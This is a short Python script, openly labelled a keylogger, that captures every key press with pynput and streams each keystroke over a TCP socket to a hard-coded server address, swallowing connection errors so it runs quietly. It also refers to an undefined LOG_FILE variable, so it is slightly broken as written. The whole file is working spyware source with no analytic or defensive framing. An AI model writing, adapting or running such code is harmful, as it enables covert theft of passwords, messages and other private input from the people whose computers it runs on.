import socket
from pynput import keyboard
from datetime import datetime

SERVER_IP = '192.168.0.195'
SERVER_PORT = 5001

# Ensure log file exists
with open(LOG_FILE, 'a') as f:
    f.write(f'\n--- Keylogger started at {datetime.now()} ---\n')

def send_keystroke(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)  # quick fail if server is offline
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data.encode())
    except Exception:
        pass  # Ignore if server is offline

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'<{key}>'
    send_keystroke(k)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener with ESC
        return False

if __name__ == '__main__':
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() 